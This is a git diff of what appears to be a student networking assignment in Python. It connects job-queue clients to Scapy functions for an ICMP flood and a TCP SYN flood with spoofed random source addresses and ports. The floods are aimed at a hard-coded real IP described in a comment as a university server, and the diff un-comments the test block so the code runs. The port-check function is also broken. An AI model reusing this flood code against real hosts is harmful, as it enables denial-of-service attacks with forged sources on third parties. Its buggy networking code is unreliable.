@@ -23,13 +23,24 @@ def new_client(server_address, client_id):
     try:
         keep_connection = True
         while keep_connection:
-            job = (client_socket.recv(1024)).decode()
+            job_id = (client_socket.recv(1024)).decode()
+            job = int(job_id)
             print("Cleint {0}: Recieved job - {1}".format(client_id, job))
-            
+           
             #Reject or Accept Job
             response = "COMPLETED {0}".format(job)
             if (random.randint(1,4) == 1):
                 response = "REJECT"
+
+            if (response != "REJECT"):
+                if (job == 11):
+                    detect_online("8.8.8.8") #detect google
+                elif(job == 12):
+                    detect_status("8.8.8.8", "993") #google's IMAP server
+                elif(job == 21):
+                    icmp_flood("137.207.71.196", 10) #flood uwindsor server
+                elif(job == 22):
+                    tcp_flood("137.207.71.196", 65535, 10) #flood uwindsor server
             
             print("Client {0}: {1}".format(client_id, response))
             client_socket.sendall(response.encode())
@@ -67,8 +78,9 @@ def detect_online(des_addr):
         host_name = socket.gethostbyaddr(des_addr)
         print("Hostname : ", host_name)
         print("IP : ", des_addr)
-    except:
+    except Exception as e:
         print("IP address is not online")
+        print(e)
 #end detect_online
 
 
@@ -76,11 +88,17 @@ def detect_online(des_addr):
 A3. Q1. #2
 """
 def detect_status(des_addr, port):
-    check = socket.connect_ex((des_addr, port))
-    if(check == 0):
-        print("port is open")
-    else:
-        print("port is closed")
+    try:
+        print("reached 12 - 1")
+        check = socket.connect((des_addr, port))
+        print("reached 12 - 1")
+        if(check == 0):
+            print("port is open")
+        else:
+            print("port is closed")
+    except Exception as e:
+        print("12 failed")
+        print(e)
 #end detect_status
 
 
@@ -89,9 +107,14 @@ A3. Q2. #1
 """
 #crafts and sents ICMP packets num amount of times
 def icmp_flood(des_addr, num):
-    for x in range (0,num):
-        packet = IP(dst=des_addr)/ICMP()
-        send(packet)
+    try:
+        for x in range (0,num):
+            packet = IP(dst=des_addr)/ICMP()
+            send(packet, verbose=False)
+        print("sent icmp flood to", des_addr)
+    except Exception as e:
+        print("21 failed")
+        print(e)
 #end icmp_flood
 
 
@@ -99,16 +122,21 @@ def icmp_flood(des_addr, num):
 A3. Q2. #2
 """
 #crafts and sends a tcp syn packet to specified address num amount of times
-def tcp_flood(des_addr, src_port, des_port, num):
-    for i in range(0, num):
-	packet = IP(src=RandIP(), dst=des_addr)/TCP(sport=src_port, dport=des_port, seq=696969, flags="S")
-	send(packet)
-
+def tcp_flood(des_addr, des_port, num):
+    try:
+        for i in range(0, num):
+            packet = IP(src=RandIP("192.168.1.1/24"), dst=des_addr)/TCP(sport=RandShort(), dport=des_port, flags="S")/Raw("X")
+            send(packet, verbose=False)
+        print("sent tcp flood to", des_addr)
+    except Exception as e:
+        print("22 failed")
+        print(e)
+        
 #end tcp_flood
 
 
 #testing  
-"""
+
 num_of_clients = int(input("How many clients? >"))
 
 server_node = JobCreatorNode()
@@ -120,7 +148,7 @@ for i in range(0,num_of_clients):
     new_client_thread = threading.Thread(target=new_client, args=(server_node.getAddress(), i+1, ))
     new_client_thread.start()
 
-"""
+
 
 
 
